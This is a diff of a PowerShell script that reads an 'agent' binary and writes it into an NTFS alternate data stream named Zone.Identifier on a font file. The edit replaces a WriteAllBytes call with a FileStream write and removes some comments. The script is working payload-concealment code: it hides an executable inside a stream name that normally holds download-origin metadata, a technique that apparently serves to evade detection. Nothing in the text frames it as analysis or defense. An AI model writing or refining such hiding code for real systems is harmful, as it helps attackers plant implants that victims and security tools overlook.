@@ -1,5 +1,5 @@
 $ProgressPreference = 'SilentlyContinue'
-$ErrorActionPreference = 'Stop'   # Stop on any error for better debugging
+$ErrorActionPreference = 'Stop'
 
 $agentPath = $env:AgentPath
 if (-not $agentPath -or -not (Test-Path $agentPath)) {
@@ -22,9 +22,14 @@ if (-not (Test-Path $fontFile)) {
 $streamName = "Zone.Identifier"
 $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
 
-# Use native NTFS stream path syntax (more reliable than Set-Content -Stream)
+# Write to ADS using FileStream (supports filename:stream syntax)
 $streamPath = "$fontFile`:$streamName"
-[System.IO.File]::WriteAllBytes($streamPath, $agentBytes)
+$fs = [System.IO.File]::Open($streamPath, 'Create', 'Write', 'None')
+try {
+    $fs.Write($agentBytes, 0, $agentBytes.Length)
+} finally {
+    $fs.Close()
+}
 
 # Verify the write succeeded
 if (-not (Test-Path $streamPath)) {
